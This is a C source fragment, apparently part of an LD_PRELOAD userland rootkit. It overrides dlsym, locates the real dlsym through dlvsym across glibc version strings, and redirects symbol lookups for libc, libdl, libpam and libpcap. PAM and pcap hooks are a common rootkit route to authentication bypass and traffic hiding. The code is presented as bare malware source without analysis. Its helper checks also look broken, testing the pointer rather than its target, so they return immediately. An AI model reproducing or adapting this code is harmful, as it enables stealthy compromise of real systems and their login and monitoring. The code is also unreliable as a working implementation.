static void get_libc_symbol(const char *symbol, void **funcptr){
	if(funcptr != NULL)
		return;
	void *libc_handle = dlopen(LIBC_PATH, RTLD_DEEPBIND);
	char *curcall;
	int i;
	for(i = 0; i < LIBC_CALLS_SIZE; i++){
		curcall = libc_calls[i];
		if(!xstrncmp(symbol,curcall)){
			*funcptr = o_dlsym(libc_handle, symbol);
			break;
		}
	}
}

static void get_libdl_symbol(const char *symbol, void **funcptr){
	if(funcptr != NULL)
		return;
	void *libdl_handle = dlopen(LIBDL_PATH, RTLD_DEEPBIND);
	char *curcall;
	int i;
	for(i = 0; i < LIBDL_CALLS_SIZE; i++){
		curcall = libdl_calls[i];
		if(!xstrncmp(symbol,curcall)){
			*funcptr = o_dlsym(libdl_handle, symbol);
			break;
		}
	}
}

static void get_libpam_symbol(const char *symbol, void **funcptr){
	if(funcptr != NULL)
		return;
	void *libpam_handle = dlopen(LIBPAM_PATH, RTLD_DEEPBIND);
	char *curcall;
	int i;
	for(i = 0; i < LIBPAM_CALLS_SIZE; i++){
		curcall = libpam_calls[i];
		if(!xstrncmp(symbol,curcall)){
			*funcptr = o_dlsym(libpam_handle, symbol);
			break;
		}
	}
}

static void get_libpcap_symbol(const char *symbol, void **funcptr){
	if(funcptr != NULL)
		return;
	void *libpcap_handle = dlopen(LIBPCAP_PATH, RTLD_DEEPBIND);
	char *curcall;
	int i;
	for(i = 0; i < LIBPCAP_CALLS_SIZE; i++){
		curcall = libpcap_calls[i];
		if(!xstrncmp(symbol,curcall)){
			*funcptr = o_dlsym(libpcap_handle, symbol);
			break;
		}
	}
}

static void locate_dlsym(void){
	if(o_dlsym != NULL)
		return;
	char buf[32];
	int a, b;
	for(a = 0; a < GLIBC_MAX_VER; a++){
		snprintf(buf, sizeof(buf), GLIBC_VER_STR, a);
		if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, "dlsym", buf)))
			return;
	}
	for(a = 0; a < GLIBC_MAX_VER; a++)
		for(b = 0; b < GLIBC_MAX_VER; b++){
			snprintf(buf, sizeof(buf), GLIBC_VERVER_STR, a, b);
			if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, "dlsym", buf)))
				return;
		}
	if(o_dlsym == NULL)
		exit(0);
}

void *dlsym(void *handle, const char *symbol){
	void *ptr = NULL;
	locate_dlsym();
	get_libc_symbol(symbol, &ptr);
	get_libdl_symbol(symbol, &ptr);
	get_libpam_symbol(symbol, &ptr);
	get_libpcap_symbol(symbol, &ptr);
	if(ptr == NULL)
		ptr = o_dlsym(handle, symbol);
	return ptr;
}
